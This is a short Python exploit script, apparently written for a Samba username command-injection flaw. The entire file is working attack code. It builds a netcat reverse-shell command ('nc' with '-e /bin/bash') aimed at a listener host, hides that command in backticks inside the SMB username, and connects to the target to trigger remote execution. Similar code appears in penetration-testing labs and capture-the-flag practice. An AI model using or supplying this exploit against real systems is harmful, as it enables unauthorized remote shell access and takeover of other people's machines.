from smb.SMBConnection import SMBConnection


def samba_exploit(rhost, rport, lhost, lport):
    try:
        payload = "nc" + " " + lhost + " " + str(lport) + " " + "-e /bin/bash"
        print("[*] Payload is crafted: " + payload)

        username = "/`" + payload + "`"
        print("[*] Starting the samba exploit...")

        conn = SMBConnection(username, "", "", "")
        conn.connect(rhost, rport, timeout=1)
        print(
            f"[*] Either you already have a connection on port {lport} or exploit failed.")
    except:
        # Timeout exception, also means payload was run. Can also be connection error which means exploit failed.
        # Connection exception should be implemented separately. For simplicity, it wasn't.
        print(f"[*] Connection is sent on port {lport} on {lhost}")
